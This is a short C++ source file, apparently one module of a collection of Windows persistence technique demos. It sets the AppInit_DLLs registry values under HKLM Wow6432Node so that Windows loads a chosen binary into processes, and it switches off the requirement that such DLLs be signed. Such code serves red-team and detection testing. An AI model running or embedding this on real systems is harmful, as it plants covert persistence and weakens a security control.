#include <windows.h>
#include <string>

#include "..\..\utils.h"

using namespace std;

HKEY RootKey = HKEY_LOCAL_MACHINE;
LPCSTR SubKey = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows";

string ExeName = "Cmd.exe";
string ExePath = string(getenv("WINDIR")) + "\\System32\\" + ExeName;

int main(){

    string binaryPath = newBinary(ExePath);
    DWORD load = 0x1;
    DWORD sign = 0x0;

    set_registry_value(RootKey, SubKey, "LoadAppInit_DLLs", NULL, &load);
    set_registry_value(RootKey, SubKey, "RequireSignedAppInit_DLLs", NULL, &sign);
    set_registry_value(RootKey, SubKey, "AppInit_DLLs", &binaryPath, NULL);

    return 0;
}